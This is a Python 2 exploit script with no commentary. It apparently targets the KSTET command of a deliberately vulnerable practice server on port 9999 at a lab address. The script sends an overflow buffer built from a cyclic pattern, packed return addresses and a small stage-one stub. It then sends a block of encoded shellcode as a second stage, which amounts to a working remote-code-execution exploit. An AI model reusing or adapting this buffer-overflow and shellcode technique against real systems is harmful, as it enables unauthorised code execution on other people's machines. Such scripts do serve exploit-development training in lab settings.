import socket
import sys
import struct

host = '192.168.56.101'
port = 9999
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

except Exception, e:
	print "socket() failed -> " + str(e)
	sys.exit(1)

connect = s.connect((host,port))
print s.recv(1024)

command = 'KSTET '
stage1 = '\x83\xec\x4c\x52\x80\xce\x05\x52\x54\x5a\x83\xc2\x68\x52\x53\xc1\xed\x08\xff\xd5'

stage2 =  ""
stage2 += "\xdb\xde\xd9\x74\x24\xf4\x58\xbf\x4e\x0f\x35\xb6"
stage2 += "\x31\xc9\xb1\x52\x83\xe8\xfc\x31\x78\x13\x03\x36"
stage2 += "\x1c\xd7\x43\x3a\xca\x95\xac\xc2\x0b\xfa\x25\x27"
stage2 += "\x3a\x3a\x51\x2c\x6d\x8a\x11\x60\x82\x61\x77\x90"
stage2 += "\x11\x07\x50\x97\x92\xa2\x86\x96\x23\x9e\xfb\xb9"
stage2 += "\xa7\xdd\x2f\x19\x99\x2d\x22\x58\xde\x50\xcf\x08"
stage2 += "\xb7\x1f\x62\xbc\xbc\x6a\xbf\x37\x8e\x7b\xc7\xa4"
stage2 += "\x47\x7d\xe6\x7b\xd3\x24\x28\x7a\x30\x5d\x61\x64"
stage2 += "\x55\x58\x3b\x1f\xad\x16\xba\xc9\xff\xd7\x11\x34"
stage2 += "\x30\x2a\x6b\x71\xf7\xd5\x1e\x8b\x0b\x6b\x19\x48"
stage2 += "\x71\xb7\xac\x4a\xd1\x3c\x16\xb6\xe3\x91\xc1\x3d"
stage2 += "\xef\x5e\x85\x19\xec\x61\x4a\x12\x08\xe9\x6d\xf4"
stage2 += "\x98\xa9\x49\xd0\xc1\x6a\xf3\x41\xac\xdd\x0c\x91"
stage2 += "\x0f\x81\xa8\xda\xa2\xd6\xc0\x81\xaa\x1b\xe9\x39"
stage2 += "\x2b\x34\x7a\x4a\x19\x9b\xd0\xc4\x11\x54\xff\x13"
stage2 += "\x55\x4f\x47\x8b\xa8\x70\xb8\x82\x6e\x24\xe8\xbc"
stage2 += "\x47\x45\x63\x3c\x67\x90\x24\x6c\xc7\x4b\x85\xdc"
stage2 += "\xa7\x3b\x6d\x36\x28\x63\x8d\x39\xe2\x0c\x24\xc0"
stage2 += "\x65\xf3\x11\xf2\x74\x9b\x63\x02\x73\x89\xed\xe4"
stage2 += "\x11\x3d\xb8\xbf\x8d\xa4\xe1\x4b\x2f\x28\x3c\x36"
stage2 += "\x6f\xa2\xb3\xc7\x3e\x43\xb9\xdb\xd7\xa3\xf4\x81"
stage2 += "\x7e\xbb\x22\xad\x1d\x2e\xa9\x2d\x6b\x53\x66\x7a"
stage2 += "\x3c\xa5\x7f\xee\xd0\x9c\x29\x0c\x29\x78\x11\x94"
stage2 += "\xf6\xb9\x9c\x15\x7a\x85\xba\x05\x42\x06\x87\x71"
stage2 += "\x1a\x51\x51\x2f\xdc\x0b\x13\x99\xb6\xe0\xfd\x4d"
stage2 += "\x4e\xcb\x3d\x0b\x4f\x06\xc8\xf3\xfe\xff\x8d\x0c"
stage2 += "\xce\x97\x19\x75\x32\x08\xe5\xac\xf6\x38\xac\xec"
stage2 += "\x5f\xd1\x69\x65\xe2\xbc\x89\x50\x21\xb9\x09\x50"
stage2 += "\xda\x3e\x11\x11\xdf\x7b\x95\xca\xad\x14\x70\xec"
stage2 += "\x02\x14\x51"

pattern = 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAA' + struct.pack("<L",0x40252c11) + struct.pack("<L",0x625011af) + stage1 +'AA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJAB'

crash = command + pattern

s.send(crash)
s.send(stage2)

print 'payload sent!'
